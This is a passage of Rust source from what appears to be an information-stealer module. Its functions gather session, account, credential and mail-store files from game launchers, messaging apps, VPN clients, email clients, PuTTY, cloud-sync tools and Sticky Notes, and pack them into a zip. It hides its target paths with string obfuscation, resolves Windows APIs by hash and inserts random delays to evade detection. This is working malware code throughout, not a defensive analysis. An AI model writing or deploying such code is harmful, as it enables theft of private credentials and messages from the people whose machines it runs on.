        n.to_ascii_lowercase().ends_with(".config")
    });
    added += add_tree_filtered(zip, &base, "App_BattleNet", 4 * ONE_MB, &|n| {
        n.ends_with(".json")
    });
    if added > 0 {
        info.add_app("Battle.net");
    }
}

fn collect_ea(zip: &mut ZipBuilder, info: &mut Info) {
    let filter = |n: &str| n.ends_with(".xml") || n.ends_with(".json") || n.ends_with(".ini");
    let mut added = 0;
    if let Some(local) = env_dir("LOCALAPPDATA") {
        let root = local.join(crate::obf!(r"Electronic Arts\EA Desktop"));
        if root.is_dir() {
            added += add_tree_filtered(zip, &root, "App_EA/EA_Desktop", 4 * ONE_MB, &filter);
        }
    }
    if let Some(roaming) = appdata() {
        let root = roaming.join(crate::obf!("Origin"));
        if root.is_dir() {
            added += add_tree_filtered(zip, &root, "App_EA/Origin", 4 * ONE_MB, &filter);
        }
    }
    if added > 0 {
        info.add_app("EA");
    }
}

fn collect_ubisoft(zip: &mut ZipBuilder, info: &mut Info) {
    let Some(local) = env_dir("LOCALAPPDATA") else { return };
    let root = local.join(crate::obf!("Ubisoft Game Launcher"));
    if !root.is_dir() {
        return;
    }
    let added = add_tree_filtered(zip, &root, "App_Ubisoft", 4 * ONE_MB, &|n| {
        n.ends_with(".yml") || n.ends_with(".json") || n.ends_with(".ini") || n.ends_with(".save")
    });
    if added > 0 {
        info.add_app("Ubisoft");
    }
}

fn collect_riot(zip: &mut ZipBuilder, info: &mut Info) {
    let Some(local) = env_dir("LOCALAPPDATA") else { return };
    let root = local.join(crate::obf!("Riot Games"));
    if !root.is_dir() {
        return;
    }
    let added = add_tree_filtered(zip, &root, "App_Riot", ONE_MB, &|n| {
        n.ends_with(".json") || n.ends_with(".yaml") || n.ends_with(".lock")
    });
    if added > 0 {
        info.add_app("Riot Games");
    }
}

fn collect_rockstar(zip: &mut ZipBuilder, info: &mut Info) {
    let Some(home) = userprofile() else { return };
    let root = home.join(crate::obf!(r"Documents\Rockstar Games\Launcher"));
    if !root.is_dir() {
        return;
    }
    let added = add_tree_filtered(zip, &root, "App_Rockstar", 4 * ONE_MB, &|n| {
        n.ends_with(".json") || n.ends_with(".xml") || n.ends_with(".ini")
    });
    if added > 0 {
        info.add_app("Rockstar");
    }
}

fn collect_gog(zip: &mut ZipBuilder, info: &mut Info) {
    let filter = |n: &str| n.ends_with(".json") || n.ends_with(".ini");
    let mut added = 0;
    if let Some(local) = env_dir("LOCALAPPDATA") {
        let root = local.join(crate::obf!(r"GOG.com\Galaxy\Configuration"));
        if root.is_dir() {
            added += add_tree_filtered(zip, &root, "App_GOG/Configuration", 4 * ONE_MB, &filter);
        }
    }
    if let Some(pd) = env_dir("ProgramData") {
        let root = pd.join(crate::obf!(r"GOG.com\Galaxy"));
        if root.is_dir() {
            added += add_tree_filtered(zip, &root, "App_GOG/ProgramData", 4 * ONE_MB, &filter);
        }
    }
    if added > 0 {
        info.add_app("GOG Galaxy");
    }
}

fn collect_minecraft(zip: &mut ZipBuilder, info: &mut Info) {
    let Some(roaming) = appdata() else { return };
    let root = roaming.join(crate::obf!(".minecraft"));
    let mut added = 0;
    for name in [
        crate::obf!("launcher_accounts.json"),
        crate::obf!("launcher_profiles.json"),
        crate::obf!("launcher_settings.json"),
        crate::obf!("usercache.json"),
        crate::obf!("servers.dat"),
    ] {
        if let Some(bytes) = read_file(&root.join(&name)) {
            zip.add_file(&format!("App_Minecraft/{name}"), &bytes);
            added += 1;
        }
    }
    if added > 0 {
        info.add_app("Minecraft");
    }
}

fn collect_roblox(zip: &mut ZipBuilder, info: &mut Info) {
    let Some(local) = env_dir("LOCALAPPDATA") else { return };
    let root = local.join(crate::obf!(r"Roblox\LocalStorage"));
    if !root.is_dir() {
        return;
    }
    // Only the app/auth storage carries session data; memProfStorage* files
    // are binary memory-profiler dumps (junk).
    let added = add_tree_filtered(zip, &root, "App_Roblox/LocalStorage", ONE_MB, &|n| {
        (n.ends_with(".json") || n.ends_with(".xml")) && !n.starts_with("memprofstorage")
    });
    if added > 0 {
        info.add_app("Roblox");
    }
}

fn collect_gaming(zip: &mut ZipBuilder, info: &mut Info) {
    collect_epic(zip, info);
    crate::jitter::sleep_jitter(20, 80);
    collect_battlenet(zip, info);
    crate::jitter::sleep_jitter(20, 80);
    collect_ea(zip, info);
    crate::jitter::sleep_jitter(20, 80);
    collect_ubisoft(zip, info);
    crate::jitter::sleep_jitter(20, 80);
    collect_riot(zip, info);
    crate::jitter::sleep_jitter(20, 80);
    collect_rockstar(zip, info);
    crate::jitter::sleep_jitter(20, 80);
    collect_gog(zip, info);
    crate::jitter::sleep_jitter(20, 80);
    collect_minecraft(zip, info);
    crate::jitter::sleep_jitter(20, 80);
    collect_roblox(zip, info);
}

// ---------------------------------------------------------------------------
// Registry enumeration helpers (hash-resolved advapi32)
// ---------------------------------------------------------------------------

const KEY_READ: u32 = 0x20019;

type FnRegOpenKeyExW = unsafe extern "system" fn(
    hkey: usize,
    subkey: *const u16,
    opts: u32,
    access: u32,
    out: *mut usize,
) -> i32;
type FnRegCloseKey = unsafe extern "system" fn(hkey: usize) -> i32;
type FnRegEnumKeyExW = unsafe extern "system" fn(
    hkey: usize,
    index: u32,
    name: *mut u16,
    name_len: *mut u32,
    reserved: *mut u32,
    class: *mut u16,
    class_len: *mut u32,
    last_write: *mut u64,
) -> i32;
type FnRegEnumValueW = unsafe extern "system" fn(
    hkey: usize,
    index: u32,
    name: *mut u16,
    name_len: *mut u32,
    reserved: *mut u32,
    typ: *mut u32,
    data: *mut u8,
    data_len: *mut u32,
) -> i32;

fn reg_open(hkey: usize, subkey: &str) -> Option<usize> {
    unsafe {
        let open: FnRegOpenKeyExW =
            std::mem::transmute(resolve(&crate::obf!("advapi32.dll"), crate::api!("RegOpenKeyExW")));
        if open as usize == 0 {
            return None;
        }
        let mut out = 0usize;
        if open(hkey, wide(subkey).as_ptr(), 0, KEY_READ, &mut out) != 0 || out == 0 {
            return None;
        }
        Some(out)
    }
}

fn reg_close(h: usize) {
    unsafe {
        let close: FnRegCloseKey = std::mem::transmute(resolve(&crate::obf!("advapi32.dll"), crate::api!("RegCloseKey")));
        if close as usize != 0 {
            close(h);
        }
    }
}

fn reg_enum_subkeys(hkey: usize, subkey: &str) -> Vec<String> {
    let mut out = Vec::new();
    unsafe {
        let Some(h) = reg_open(hkey, subkey) else {
            return out;
        };
        let enumk: FnRegEnumKeyExW =
            std::mem::transmute(resolve(&crate::obf!("advapi32.dll"), crate::api!("RegEnumKeyExW")));
        if enumk as usize != 0 {
            for i in 0..1024u32 {
                let mut buf = [0u16; 256];
                let mut len = 256u32;
                let r = enumk(
                    h,
                    i,
                    buf.as_mut_ptr(),
                    &mut len,
                    std::ptr::null_mut(),
                    std::ptr::null_mut(),
                    std::ptr::null_mut(),
                    std::ptr::null_mut(),
                );
                if r != 0 {
                    break;
                }
                out.push(String::from_utf16_lossy(&buf[..len as usize]));
            }
        }
        reg_close(h);
    }
    out
}

/// Enumerate values of a key: (name, REG_ type, raw data, ≤64KB).
fn reg_enum_values(hkey: usize, subkey: &str) -> Vec<(String, u32, Vec<u8>)> {
    let mut out = Vec::new();
    unsafe {
        let Some(h) = reg_open(hkey, subkey) else {
            return out;
        };
        let enumv: FnRegEnumValueW =
            std::mem::transmute(resolve(&crate::obf!("advapi32.dll"), crate::api!("RegEnumValueW")));
        if enumv as usize != 0 {
            for i in 0..256u32 {
                let mut name = [0u16; 256];
                let mut name_len = 256u32;
                let mut typ = 0u32;
                let mut data = vec![0u8; 64 * 1024];
                let mut data_len = data.len() as u32;
                let r = enumv(
                    h,
                    i,
                    name.as_mut_ptr(),
                    &mut name_len,
                    std::ptr::null_mut(),
                    &mut typ,
                    data.as_mut_ptr(),
                    &mut data_len,
                );
                if r != 0 {
                    break;
                }
                data.truncate(data_len as usize);
                out.push((String::from_utf16_lossy(&name[..name_len as usize]), typ, data));
            }
        }
        reg_close(h);
    }
    out
}

fn reg_value_to_string(typ: u32, data: &[u8]) -> Option<String> {
    match typ {
        1 | 2 | 7 => {
            // REG_SZ / REG_EXPAND_SZ / REG_MULTI_SZ
            if data.len() < 2 {
                return None;
            }
            let units: Vec<u16> = data
                .chunks_exact(2)
                .map(|c| u16::from_le_bytes([c[0], c[1]]))
                .collect();
            let end = units.iter().position(|&c| c == 0).unwrap_or(units.len());
            let s = String::from_utf16_lossy(&units[..end]).trim().to_string();
            if s.is_empty() {
                None
            } else {
                Some(s)
            }
        }
        4 if data.len() >= 4 => Some(u32::from_le_bytes(data[..4].try_into().ok()?).to_string()),
        11 if data.len() >= 8 => Some(u64::from_le_bytes(data[..8].try_into().ok()?).to_string()),
        _ => None,
    }
}

// ---------------------------------------------------------------------------
// Messaging
// ---------------------------------------------------------------------------

fn collect_skype(zip: &mut ZipBuilder, info: &mut Info) {
    let Some(roaming) = appdata() else { return };
    let mut added = 0;
    let desktop = roaming.join(crate::obf!(r"Microsoft\Skype for Desktop\Local Storage"));
    if desktop.is_dir() {
        added += add_tree(zip, &desktop, "App_Skype/Local Storage", ONE_MB);
    }
    // Legacy Skype: per-account main.db.
    let legacy = roaming.join(crate::obf!("Skype"));
    if let Ok(entries) = std::fs::read_dir(&legacy) {
        for entry in entries.flatten() {
            let p = entry.path();
            if !p.is_dir() {
                continue;
            }
            let db = p.join(crate::obf!("main.db"));
            if let Some(bytes) = read_file(&db) {
                if bytes.len() > 64 * 1024 * 1024 {
                    continue;
                }
                let name = if added == 0 {
                    "main.db".to_string()
                } else {
                    let acc = p
                        .file_name()
                        .map(|n| n.to_string_lossy().into_owned())
                        .unwrap_or_default();
                    format!("main_{acc}.db")
                };
                zip.add_file(&format!("App_Skype/{name}"), &bytes);
                added += 1;
            }
        }
    }
    if added > 0 {
        info.add_app("Skype");
    }
}

fn collect_slack(zip: &mut ZipBuilder, info: &mut Info) {
    let Some(roaming) = appdata() else { return };
    let base = roaming.join(crate::obf!("Slack"));
    if !base.is_dir() {
        return;
    }
    let mut added = 0;
    let ls = base.join(crate::obf!("Local Storage"));
    if ls.is_dir() {
        added += add_tree(zip, &ls, "App_Slack/Local Storage", ONE_MB);
    }
    added += add_flat(zip, &base, "App_Slack", ONE_MB, &|n| {
        n.to_ascii_lowercase().ends_with(".json")
    });
    if added > 0 {
        info.add_app("Slack");
    }
}

fn collect_teams(zip: &mut ZipBuilder, info: &mut Info) {
    let Some(roaming) = appdata() else { return };
    let base = roaming.join(crate::obf!(r"Microsoft\Teams"));
    if !base.is_dir() {
        return;
    }
    let mut added = 0;
    let ls = base.join(crate::obf!("Local Storage"));
    if ls.is_dir() {
        added += add_tree(zip, &ls, "App_Teams/Local Storage", ONE_MB);
    }
    added += add_flat(zip, &base, "App_Teams", ONE_MB, &|n| {
        n.to_ascii_lowercase().ends_with(".json")
    });
    if added > 0 {
        info.add_app("Teams");
    }
}

fn collect_whatsapp(zip: &mut ZipBuilder, info: &mut Info) {
    let mut added = 0;
    if let Some(local) = env_dir("LOCALAPPDATA") {
        let base = local.join(crate::obf!("WhatsApp"));
        if base.is_dir() {
            added += add_flat(zip, &base, "App_WhatsApp", ONE_MB, &|n| {
                let l = n.to_ascii_lowercase();
                l.ends_with(".db") || l.ends_with(".sqlite")
            });
        }
    }
    if let Some(roaming) = appdata() {
        let base = roaming.join(crate::obf!("WhatsApp"));
        if base.is_dir() {
            added += add_tree(zip, &base, "App_WhatsApp/Roaming", ONE_MB);
        }
    }
    if added > 0 {
        info.add_app("WhatsApp");
    }
}

fn collect_pidgin(zip: &mut ZipBuilder, info: &mut Info) {
    let Some(roaming) = appdata() else { return };
    if let Some(bytes) = read_file(&roaming.join(crate::obf!(r".purple\accounts.xml"))) {
        zip.add_file("App_Pidgin/accounts.xml", &bytes);
        info.add_app("Pidgin");
    }
}

fn collect_messaging(zip: &mut ZipBuilder, info: &mut Info) {
    collect_skype(zip, info);
    crate::jitter::sleep_jitter(20, 80);
    collect_slack(zip, info);
    crate::jitter::sleep_jitter(20, 80);
    collect_teams(zip, info);
    crate::jitter::sleep_jitter(20, 80);
    collect_whatsapp(zip, info);
    crate::jitter::sleep_jitter(20, 80);
    collect_pidgin(zip, info);
}

// ---------------------------------------------------------------------------
// VPN clients
// ---------------------------------------------------------------------------

fn collect_protonvpn(zip: &mut ZipBuilder, info: &mut Info) {
    let filter = |n: &str| n.ends_with(".json") || n.ends_with(".ovpn") || n.ends_with(".config");
    let mut added = 0;
    if let Some(local) = env_dir("LOCALAPPDATA") {
        let root = local.join(crate::obf!("ProtonVPN"));
        if root.is_dir() {
            added += add_tree_filtered(zip, &root, "App_ProtonVPN/Local", ONE_MB, &filter);
        }
    }
    if let Some(roaming) = appdata() {
        let root = roaming.join(crate::obf!("ProtonVPN"));
        if root.is_dir() {
            added += add_tree_filtered(zip, &root, "App_ProtonVPN/Roaming", ONE_MB, &filter);
        }
    }
    if added > 0 {
        info.add_app("ProtonVPN");
    }
}

fn collect_nordvpn(zip: &mut ZipBuilder, info: &mut Info) {
    let Some(local) = env_dir("LOCALAPPDATA") else { return };
    let root = local.join(crate::obf!("NordVPN"));
    if !root.is_dir() {
        return;
    }
    let added = add_tree_filtered(zip, &root, "App_NordVPN", ONE_MB, &|n| {
        n.ends_with(".json") || n.ends_with(".xml") || n.ends_with(".config")
    });
    if added > 0 {
        info.add_app("NordVPN");
    }
}

fn collect_expressvpn(zip: &mut ZipBuilder, info: &mut Info) {
    let Some(local) = env_dir("LOCALAPPDATA") else { return };
    let root = local.join(crate::obf!("ExpressVPN"));
    if !root.is_dir() {
        return;
    }
    let added = add_tree_filtered(zip, &root, "App_ExpressVPN", ONE_MB, &|n| {
        n.ends_with(".json")
            || n.ends_with(".xml")
            || n.ends_with(".ini")
            || n.ends_with(".conf")
            || n.ends_with(".config")
    });
    if added > 0 {
        info.add_app("ExpressVPN");
    }
}

fn collect_mullvad(zip: &mut ZipBuilder, info: &mut Info) {
    let Some(roaming) = appdata() else { return };
    let root = roaming.join(crate::obf!("Mullvad VPN"));
    if !root.is_dir() {
        return;
    }
    let added = add_tree_filtered(zip, &root, "App_Mullvad", ONE_MB, &|n| {
        n.ends_with(".json") || n.ends_with(".conf")
    });
    if added > 0 {
        info.add_app("Mullvad");
    }
}

fn collect_surfshark(zip: &mut ZipBuilder, info: &mut Info) {
    let Some(local) = env_dir("LOCALAPPDATA") else { return };
    let root = local.join(crate::obf!("Surfshark"));
    if !root.is_dir() {
        return;
    }
    let added = add_tree_filtered(zip, &root, "App_Surfshark", ONE_MB, &|n| {
        n.ends_with(".json")
            || n.ends_with(".xml")
            || n.ends_with(".ini")
            || n.ends_with(".conf")
            || n.ends_with(".config")
    });
    if added > 0 {
        info.add_app("Surfshark");
    }
}

fn collect_anyconnect(zip: &mut ZipBuilder, info: &mut Info) {
    let mut added = 0;
    if let Some(pd) = env_dir("ProgramData") {
        let profile = pd.join(crate::obf!(r"Cisco\Cisco AnyConnect Secure Mobility Client\Profile"));
        if profile.is_dir() {
            added += add_flat(zip, &profile, "App_AnyConnect/Profile", ONE_MB, &|n| {
                n.to_ascii_lowercase().ends_with(".xml")
            });
        }
    }
    if let Some(local) = env_dir("LOCALAPPDATA") {
        let prefs = local.join(crate::obf!(r"Cisco\Cisco AnyConnect Secure Mobility Client\preferences.xml"));
        if let Some(bytes) = read_file(&prefs) {
            zip.add_file("App_AnyConnect/preferences.xml", &bytes);
            added += 1;
        }
    }
    if added > 0 {
        info.add_app("AnyConnect");
    }
}

fn collect_globalprotect(zip: &mut ZipBuilder, info: &mut Info) {
    let filter = |n: &str| n.ends_with(".xml") || n.ends_with(".dat");
    let mut added = 0;
    if let Some(pd) = env_dir("ProgramData") {
        let root = pd.join(crate::obf!(r"Palo Alto Networks\GlobalProtect"));
        if root.is_dir() {
            added += add_tree_filtered(zip, &root, "App_GlobalProtect/ProgramData", 4 * ONE_MB, &filter);
        }
    }
    if let Some(local) = env_dir("LOCALAPPDATA") {
        let root = local.join(crate::obf!("Palo Alto Networks"));
        if root.is_dir() {
            added += add_tree_filtered(zip, &root, "App_GlobalProtect/Local", 4 * ONE_MB, &filter);
        }
    }
    if added > 0 {
        info.add_app("GlobalProtect");
    }
}

fn collect_vpn(zip: &mut ZipBuilder, info: &mut Info) {
    collect_protonvpn(zip, info);
    crate::jitter::sleep_jitter(20, 80);
    collect_nordvpn(zip, info);
    crate::jitter::sleep_jitter(20, 80);
    collect_expressvpn(zip, info);
    crate::jitter::sleep_jitter(20, 80);
    collect_mullvad(zip, info);
    crate::jitter::sleep_jitter(20, 80);
    collect_surfshark(zip, info);
    crate::jitter::sleep_jitter(20, 80);
    collect_anyconnect(zip, info);
    crate::jitter::sleep_jitter(20, 80);
    collect_globalprotect(zip, info);
}

// ---------------------------------------------------------------------------
// Email clients
// ---------------------------------------------------------------------------

fn collect_foxmail(zip: &mut ZipBuilder, info: &mut Info) {
    let mut added = 0;
    if let Some(local) = env_dir("LOCALAPPDATA") {
        let root = local.join("Foxmail");
        if root.is_dir() {
            added += add_tree(zip, &root, "App_FoxMail/Local", 4 * ONE_MB);
        }
    }
    if let Some(roaming) = appdata() {
        let root = roaming.join("Foxmail");
        if root.is_dir() {
            added += add_tree(zip, &root, "App_FoxMail/Roaming", 4 * ONE_MB);
        }
    }
    if added > 0 {
        info.add_app("FoxMail");
    }
}

fn collect_mailbird(zip: &mut ZipBuilder, info: &mut Info) {
    let Some(local) = env_dir("LOCALAPPDATA") else { return };
    let root = local.join("Mailbird");
    if !root.is_dir() {
        return;
    }
    let added = add_tree_filtered(zip, &root, "App_MailBird", 4 * ONE_MB, &|n| {
        n.ends_with(".db") || n.ends_with(".json") || n.ends_with(".config")
    });
    if added > 0 {
        info.add_app("MailBird");
    }
}

fn collect_mailmaster(zip: &mut ZipBuilder, info: &mut Info) {
    let mut added = 0;
    if let Some(roaming) = appdata() {
        let root = roaming.join("MailMaster");
        if root.is_dir() {
            added += add_tree(zip, &root, "App_MailMaster/Roaming", 4 * ONE_MB);
        }
    }
    if let Some(local) = env_dir("LOCALAPPDATA") {
        let root = local.join("MailMaster");
        if root.is_dir() {
            added += add_tree(zip, &root, "App_MailMaster/Local", 4 * ONE_MB);
        }
    }
    if added > 0 {
        info.add_app("MailMaster");
    }
}

fn collect_outlook(zip: &mut ZipBuilder, info: &mut Info) {
    let mut found = false;
    // Profiles from registry (16.0, fallback 15.0).
    for ver in ["16.0", "15.0"] {
        let base = format!(
            r"{}{ver}{}",
            crate::obf!(r"Software\Microsoft\Office\"),
            crate::obf!(r"\Outlook\Profiles")
        );
        let profiles = reg_enum_subkeys(HKEY_CURRENT_USER, &base);
        if profiles.is_empty() {
            continue;
        }
        let mut out = Vec::new();
        for p in profiles {
            let values = reg_enum_values(HKEY_CURRENT_USER, &format!(r"{base}\{p}"));
            let vals: Vec<serde_json::Value> = values
                .iter()
                .filter_map(|(n, t, d)| {
                    reg_value_to_string(*t, d).map(|v| serde_json::json!({ "name": n, "value": v }))
                })
                .collect();
            out.push(serde_json::json!({ "profile": p, "values": vals }));
        }
        zip.add_file(
            "App_Outlook/profiles.json",
            &json_bom(&serde_json::Value::Array(out)),
        );
        found = true;
        break;
    }
    // PST/OST files, capped at 25MB each.
    let is_mail_store = |n: &str| n.ends_with(".pst") || n.ends_with(".ost");
    if let Some(home) = userprofile() {
        let d = home.join(crate::obf!(r"Documents\Outlook Files"));
        if d.is_dir() {
            found |= add_tree_filtered(zip, &d, "App_Outlook", 25 * ONE_MB, &is_mail_store) > 0;
        }
    }
    if let Some(local) = env_dir("LOCALAPPDATA") {
        let d = local.join(crate::obf!(r"Microsoft\Outlook"));
        if d.is_dir() {
            found |= add_tree_filtered(zip, &d, "App_Outlook", 25 * ONE_MB, &is_mail_store) > 0;
        }
    }
    if found {
        info.add_app("Outlook");
    }
}

fn collect_email(zip: &mut ZipBuilder, info: &mut Info) {
    collect_foxmail(zip, info);
    crate::jitter::sleep_jitter(20, 80);
    collect_mailbird(zip, info);
    crate::jitter::sleep_jitter(20, 80);
    collect_mailmaster(zip, info);
    crate::jitter::sleep_jitter(20, 80);
    collect_outlook(zip, info);
}

// ---------------------------------------------------------------------------
// Remote access / other
// ---------------------------------------------------------------------------

fn collect_putty(zip: &mut ZipBuilder, info: &mut Info) {
    let sessions_key = crate::obf!(r"Software\SimonTatham\PuTTY\Sessions");
    let sessions = reg_enum_subkeys(HKEY_CURRENT_USER, &sessions_key);
    if sessions.is_empty() {
        return;
    }
    let mut out = Vec::new();
    for s in sessions {
        let values = reg_enum_values(HKEY_CURRENT_USER, &format!(r"{sessions_key}\{s}"));
        let get = |name: &str| {
            values
                .iter()
                .find(|(n, _, _)| n.eq_ignore_ascii_case(name))
                .and_then(|(_, t, d)| reg_value_to_string(*t, d))
                .unwrap_or_default()
        };
        out.push(serde_json::json!({
            "name": s,
            "host": get(&crate::obf!("HostName")),
            "user": get(&crate::obf!("UserName")),
            "port": get(&crate::obf!("PortNumber")),
            "protocol": get(&crate::obf!("Protocol")),
        }));
    }
    if out.is_empty() {
        return;
    }
    zip.add_file(
        "App_PuTTY/sessions.json",
        &json_bom(&serde_json::Value::Array(out)),
    );
    info.add_app("PuTTY");
}

fn collect_idm(zip: &mut ZipBuilder, info: &mut Info) {
    let Some(roaming) = appdata() else { return };
    let root = roaming.join(crate::obf!("IDM"));
    if !root.is_dir() {
        return;
    }
    if add_tree(zip, &root, "App_IDM", 4 * ONE_MB) > 0 {
        info.add_app("IDM");
    }
}

fn collect_cloud(zip: &mut ZipBuilder, info: &mut Info) {
    if let Some(roaming) = appdata() {
        let dropbox = roaming.join(crate::obf!("Dropbox"));
        if dropbox.is_dir() {
            let added = add_flat(zip, &dropbox, "App_Dropbox", 4 * ONE_MB, &|n| {
                let l = n.to_ascii_lowercase();
                l.ends_with(".json") || l == crate::obf!("host.db")
            });
            if added > 0 {
                info.add_app("Dropbox");
            }
        }
    }
    if let Some(local) = env_dir("LOCALAPPDATA") {
        let gdrive = local.join(crate::obf!(r"Google\Drive"));
        if gdrive.is_dir() && add_tree(zip, &gdrive, "App_GoogleDrive", 4 * ONE_MB) > 0 {
            info.add_app("Google Drive");
        }
        let onedrive = local.join(crate::obf!(r"Microsoft\OneDrive\settings"));
        if onedrive.is_dir() && add_tree(zip, &onedrive, "App_OneDrive", 4 * ONE_MB) > 0 {
            info.add_app("OneDrive");
        }
    }
}

fn collect_remote_misc(zip: &mut ZipBuilder, info: &mut Info) {
    collect_putty(zip, info);
    crate::jitter::sleep_jitter(20, 80);
    collect_idm(zip, info);
    crate::jitter::sleep_jitter(20, 80);
    collect_cloud(zip, info);
}

// ---------------------------------------------------------------------------
// Sticky Notes (plum.sqlite, WAL-replayed in memory via sqlutil)
// ---------------------------------------------------------------------------

fn sql_val_str(v: &rusqlite::types::Value) -> String {
    use rusqlite::types::Value;
    match v {
        Value::Text(s) => s.clone(),
        Value::Integer(i) => i.to_string(),
        Value::Real(f) => f.to_string(),
        Value::Blob(b) => String::from_utf8_lossy(b).into_owned(),
        Value::Null => String::new(),
    }
}

/// Defensive Note-table parse: prefer Id/Text/CreatedAt; if the schema
/// differs, dump all text columns of every row.
fn parse_sticky_notes(conn: &rusqlite::Connection) -> Vec<serde_json::Value> {
    use rusqlite::types::Value;
    let mut out = Vec::new();
    let Ok(mut stmt) = conn.prepare(crate::obf!("SELECT * FROM Note").as_str()) else {
        return out;
    };
    let cols: Vec<String> = stmt.column_names().iter().map(|s| s.to_string()).collect();
    let ncols = cols.len();
    let Ok(mut rows) = stmt.query([]) else {
        return out;
    };
    loop {
        let Ok(Some(row)) = rows.next() else {
            break;
        };
        let mut fields: Vec<(String, String)> = Vec::with_capacity(ncols);
        for (i, col) in cols.iter().enumerate() {
            let v = row.get::<_, Value>(i).unwrap_or(Value::Null);
            fields.push((col.clone(), sql_val_str(&v)));
        }
        let get = |name: &str| {
            fields
                .iter()
                .find(|(n, _)| n.eq_ignore_ascii_case(name))
                .map(|(_, v)| v.clone())
        };
        let id = get("Id").unwrap_or_default();
        let created = get("CreatedAt")
            .or_else(|| get("Created"))
            .or_else(|| get("UpdatedAt"))
            .unwrap_or_default();
        let text = get("Text").or_else(|| get("Content")).unwrap_or_else(|| {
            // Unknown schema: concatenate every text-ish column.
            fields
                .iter()
                .filter(|(_, v)| !v.is_empty() && v.parse::<i64>().is_err())
                .map(|(n, v)| format!("{n}: {v}"))
                .collect::<Vec<_>>()
                .join("\n")
        });
        if text.is_empty() {
            continue;
        }
        out.push(serde_json::json!({ "id": id, "text": text, "created": created }));
    }
    out
}

fn collect_sticky_notes(zip: &mut ZipBuilder, info: &mut Info) {
    let Some(local) = env_dir("LOCALAPPDATA") else { return };
    let packages = local.join("Packages");
    let Ok(entries) = std::fs::read_dir(&packages) else {
        return;
    };
    let mut notes = Vec::new();
    for entry in entries.flatten() {
        let p = entry.path();
        if !p.is_dir() {
            continue;
        }
        let name = p
            .file_name()
            .map(|n| n.to_string_lossy().into_owned())
            .unwrap_or_default();
        if !name.starts_with(&crate::obf!("Microsoft.MicrosoftStickyNotes_")) {
            continue;
        }
        // sqlutil replays plum.sqlite-wal in memory, catching recent notes.
        if let Some(db) = crate::sqlutil::open(&p.join(crate::obf!(r"LocalState\plum.sqlite"))) {
            notes.extend(parse_sticky_notes(&db));
        }
    }
    if notes.is_empty() {
        return;
    }
    zip.add_file(
        "System/stickynotes.json",
        &json_bom(&serde_json::Value::Array(notes)),
    );
    info.add_app("Sticky Notes");
}

// ---------------------------------------------------------------------------

pub fn collect(zip: &mut ZipBuilder, info: &mut Info) {
    collect_discord(zip, info);
    collect_steam(zip, info);
    collect_telegram(zip, info);
    collect_loose(zip, info);
    collect_gaming(zip, info);
    crate::jitter::sleep_jitter(20, 80);
    collect_messaging(zip, info);
    crate::jitter::sleep_jitter(20, 80);
    collect_vpn(zip, info);
    crate::jitter::sleep_jitter(20, 80);
    collect_email(zip, info);
    crate::jitter::sleep_jitter(20, 80);
    collect_remote_misc(zip, info);
    crate::jitter::sleep_jitter(20, 80);
    collect_sticky_notes(zip, info);
    collect_wifi(zip, info);
    collect_credentials(zip, info);
    collect_product_key(zip, info);
}
